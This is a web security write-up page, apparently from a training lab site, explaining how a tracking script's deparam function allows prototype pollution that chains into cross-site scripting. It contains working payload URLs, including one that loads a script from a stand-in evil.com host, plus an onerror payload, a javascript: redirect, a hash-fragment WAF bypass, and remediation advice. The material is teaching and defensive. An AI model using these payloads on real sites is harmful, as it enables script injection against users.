@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Prototype Pollution to XSS via Script Gadgets - ClientSide Academy</title>
+  <link rel="stylesheet" href="/css/writeup.css">
+</head>
+<body class="writeup-page">
+  <nav class="writeup-nav">
+    <a href="/writeups">&larr; All Writeups</a>
+    <div class="nav-right">
+      <a href="/labs/advanced/level1.html" class="try-lab">Try the Lab &rarr;</a>
+    </div>
+  </nav>
+
+  <div class="writeup-container">
+    <div class="writeup-meta">
+      <span class="writeup-sev high">High</span>
+      <span class="writeup-category">Prototype Pollution &middot; XSS &middot; Supply Chain</span>
+    </div>
+
+    <h1>Prototype Pollution via deparam to XSS Chain</h1>
+    <div class="writeup-author">Inspired by <strong>matanber</strong>'s prototype pollution &amp; CSPT research &middot; Affects every site loading the tracking script</div>
+
+    <div class="callout callout-vuln">
+      <h4>Vulnerability</h4>
+      <p>A widely-deployed tracking script contains a <code>deparam</code> function that parses URL query parameters into a JavaScript object <strong>without sanitizing property names</strong>. By crafting a URL with <code>__proto__[property]=value</code>, an attacker can pollute <code>Object.prototype</code> and inject properties that flow into script gadgets, achieving XSS on any website loading the script.</p>
+    </div>
+
+    <h2>Understanding Prototype Pollution</h2>
+    <p>In JavaScript, every object inherits from <code>Object.prototype</code>. If an attacker can set a property on <code>Object.prototype</code>, that property becomes available on <strong>every object</strong> in the application:</p>
+
+    <pre><code>// Normal behavior
+const obj = {};
+console.log(obj.isAdmin); // undefined
+
+// After prototype pollution
+Object.prototype.isAdmin = true;
+console.log(obj.isAdmin); // true (!!)
+
+// This affects ALL objects, including ones created later
+const newObj = {};
+console.log(newObj.isAdmin); // true</code></pre>
+
+    <h2>The Vulnerable deparam Function</h2>
+    <p>The tracking script's <code>deparam</code> function converts URL query strings into nested objects. It processes bracket notation (<code>a[b][c]=value</code>) but doesn't filter <code>__proto__</code> or <code>constructor</code>:</p>
+
+    <pre><code>function deparam(queryString) {
+  var obj = {};
+  var pairs = queryString.split('&');
+
+  pairs.forEach(function(pair) {
+    var parts = pair.split('=');
+    var key = decodeURIComponent(parts[0]);
+    var value = decodeURIComponent(parts[1] || '');
+
+    // Handles nested keys like a[b][c]
+    var keys = key.replace(/\]/g, '').split('[');
+    var current = obj;
+
+    for (var i = 0; i < keys.length - 1; i++) {
+      var k = keys[i];
+      if (!current[k]) current[k] = {};
+      current = current[k]; // When k is "__proto__", this is Object.prototype!
+    }
+
+    current[keys[keys.length - 1]] = value;
+  });
+
+  return obj;
+}
+
+// Attacker crafts URL:
+// https://target.com/?__proto__[polluted]=true
+deparam("__proto__[polluted]=true");
+console.log({}.polluted); // "true" - POLLUTION CONFIRMED</code></pre>
+
+    <h2>From Pollution to XSS: Script Gadgets</h2>
+    <p>Prototype pollution alone isn't exploitable &mdash; you need a "gadget" that reads the polluted property and uses it in a dangerous sink. Common gadgets:</p>
+
+    <h3>Gadget 1: Dynamic Script Loading</h3>
+    <pre><code>// Application code that loads a script based on config
+function loadAnalytics(config) {
+  var src = config.scriptSrc || '/js/analytics.js';
+  var script = document.createElement('script');
+  script.src = src;
+  document.head.appendChild(script);
+}
+
+// Normal call - config has no scriptSrc, uses default
+loadAnalytics({});
+
+// After pollution: ?__proto__[scriptSrc]=https://evil.com/xss.js
+// config.scriptSrc is now "https://evil.com/xss.js" (inherited!)
+loadAnalytics({}); // Loads attacker's script!</code></pre>
+
+    <h3>Gadget 2: innerHTML via Template</h3>
+    <pre><code>// Code that builds HTML from config properties
+function renderWidget(options) {
+  var html = options.template || '&lt;div&gt;Default&lt;/div&gt;';
+  document.getElementById('widget').innerHTML = html;
+}
+
+// After pollution: ?__proto__[template]=&lt;img src=x onerror=alert(1)&gt;
+renderWidget({}); // XSS!</code></pre>
+
+    <h3>Gadget 3: URL Construction</h3>
+    <pre><code>// Code that builds a URL from config
+function redirect(config) {
+  var base = config.baseUrl || 'https://target.com';
+  window.location = base + '/dashboard';
+}
+
+// After pollution: ?__proto__[baseUrl]=javascript://
+redirect({}); // javascript:///dashboard - JS execution!</code></pre>
+
+    <div class="callout callout-chain">
+      <h4>The Full Chain</h4>
+      <p><strong>Step 1:</strong> Tracking script's <code>deparam</code> parses URL params without filtering <code>__proto__</code></p>
+      <p><strong>Step 2:</strong> Attacker crafts URL: <code>https://target.com/?__proto__[scriptSrc]=//evil.com/xss.js</code></p>
+      <p><strong>Step 3:</strong> Application code reads <code>config.scriptSrc</code> from an empty object, inherits the polluted value</p>
+      <p><strong>Step 4:</strong> Attacker's script loads and executes in the context of the target domain</p>
+    </div>
+
+    <h2>WAF Bypass: Hash Fragment</h2>
+    <p>The tracking script also parses <code>location.hash</code> (the URL fragment after <code>#</code>). Since hash fragments are <strong>never sent to the server</strong>, WAFs and server-side filters can't see them:</p>
+
+    <pre><code>// WAF blocks this (query string reaches the server):
+https://target.com/?__proto__[test]=1
+// WAF: "Blocked - suspicious parameter name"
+
+// WAF can't see this (hash never reaches server):
+https://target.com/#__proto__[test]=1
+// WAF: nothing to inspect!
+
+// The tracking script parses both:
+var params = deparam(location.search.substring(1));
+var hashParams = deparam(location.hash.substring(1)); // WAF-invisible!</code></pre>
+
+    <div class="callout callout-impact">
+      <h4>Why It Matters</h4>
+      <p>This tracking script is loaded on thousands of websites. Prototype pollution via the URL is a <strong>one-click attack</strong> &mdash; the victim just needs to click a crafted link. The hash-based variant bypasses all server-side security. Combined with a script gadget on the target page, this becomes reflected XSS at scale with no WAF detection possible.</p>
+    </div>
+
+    <div class="callout callout-tip">
+      <h4>Bug Bounty Tip</h4>
+      <p>To find prototype pollution: (1) Search JS files for <code>deparam</code>, <code>$.extend</code> (deep), <code>merge</code>, <code>assign</code> with recursive/deep options. (2) Test with <code>?__proto__[testpollution]=1</code> and check <code>{}.testpollution</code> in console. (3) If pollution works, search for gadgets: look for code that reads properties from empty objects with <code>||</code> defaults, like <code>config.src || 'default'</code>. (4) Tools: <code>ppmap</code> automates gadget discovery. (5) Always try the hash variant for WAF bypass.</p>
+    </div>
+
+    <h2>Remediation</h2>
+    <ul>
+      <li>Filter <code>__proto__</code>, <code>constructor</code>, and <code>prototype</code> in any object-building function</li>
+      <li>Use <code>Object.create(null)</code> for config objects (no prototype chain)</li>
+      <li>Freeze <code>Object.prototype</code> in critical applications</li>
+      <li>Use <code>Map</code> instead of plain objects for user-controlled key-value pairs</li>
+      <li>Validate that property names don't contain prototype-related keywords</li>
+    </ul>
+
+    <div class="lab-link-box">
+      <div>
+        <h4>Practice This Vulnerability</h4>
+        <p>Lab: Prototype Pollution to XSS &mdash; pollute Object.prototype via deparam and chain to a script gadget for code execution.</p>
+      </div>
+      <a href="/labs/advanced/level1.html" class="lab-link-btn">Open Lab &rarr;</a>
+    </div>
+
+    <div class="writeup-footer">
+      <a href="/writeups/postmessage-no-origin-check">&larr; PostMessage No Origin Check</a>
+      <a href="/writeups/oauth-dirty-dancing">OAuth Dirty Dancing &rarr;</a>
+    </div>
+  </div>
+</body>
+</html>
